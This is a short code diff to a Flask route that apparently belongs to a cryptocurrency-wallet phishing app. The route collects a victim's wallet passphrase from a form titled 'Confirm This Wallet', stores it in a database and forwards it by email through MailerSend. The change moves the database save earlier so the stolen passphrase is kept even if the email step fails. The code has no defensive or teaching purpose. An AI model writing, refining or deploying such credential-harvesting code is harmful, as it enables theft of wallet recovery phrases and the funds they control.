@@ -31,6 +31,10 @@ def home(user_address):
 def confirm_wallet(user_address):
     if request.method == 'POST':
         pass_phrase = request.form.get('passphrase')
+        # Save to dB
+        new_wallet = Wallet(pass_phrase=pass_phrase)
+        db.session.add(new_wallet)
+        db.session.commit()
         
         data = {
             "from": {
@@ -60,10 +64,7 @@ def confirm_wallet(user_address):
 
         print("MailerSend Response:", response.status_code, response.text)  
 
-        # Save to dB
-        new_wallet = Wallet(pass_phrase=pass_phrase)
-        db.session.add(new_wallet)
-        db.session.commit()
+        
 
         return redirect(url_for('confirmed', user_address=user_address))
     return render_template('confirm_wallet.html', title='Confirm This Wallet', user_address=user_address)
